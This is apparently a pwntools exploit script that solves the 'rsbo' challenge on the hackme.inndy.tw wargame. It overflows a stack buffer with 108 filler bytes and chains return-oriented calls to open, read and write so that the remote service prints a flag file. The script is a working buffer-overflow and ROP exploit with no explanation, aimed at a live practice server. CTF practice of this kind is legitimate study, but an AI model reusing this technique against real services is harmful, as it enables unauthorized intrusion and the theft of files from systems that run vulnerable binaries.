#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'niexinming'

from pwn import *
context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'linux', log_level = 'debug')

def debug(addr = '0x08048729'):
    raw_input('debug:')
    gdb.attach(io, "b *" + addr)

flag_addr=0x080487D0

pop_pop_ret=0x0804879e # pop edi ; pop ebp ; ret
pop_pop_pop_ret=0x0804879d # pop esi ; pop edi ; pop ebp ; ret

start_addr=0x08048490


elf = ELF('/home/h11p/hackme/rsbo')
open_addr=elf.plt["open"]
read_addr=elf.plt["read"]
write_addr=elf.plt["write"]
bss_addr=elf.bss()

#io = process('/home/h11p/hackme/rsbo')

io = remote('hackme.inndy.tw',7706)

'''
payload1 = "\x00"*108+p32(open_addr)+p32(pop_pop_ret)+p32(flag_addr)+p32(0)+p32(start_addr)
payload2 = "\x00"*108+p32(read_addr)+p32(start_addr)+p32(3)+p32(bss_addr)+p32(0x60)
payload3 = "\x00"*108+p32(write_addr)+p32(pop_pop_pop_ret)+p32(1)+p32(bss_addr)+p32(0x60)
'''
payload1=fit({108: p32(open_addr)+p32(pop_pop_ret)+p32(flag_addr)+p32(0)+p32(start_addr)}, filler = '\x00')
payload2=fit({108: p32(read_addr)+p32(start_addr)+p32(3)+p32(bss_addr)+p32(0x60)}, filler = '\x00')
payload3=fit({108: p32(write_addr)+p32(pop_pop_pop_ret)+p32(1)+p32(bss_addr)+p32(0x60)}, filler = '\x00')
#debug()
io.send(payload1)
io.send(payload2)
io.send(payload3)
io.interactive()

io.close()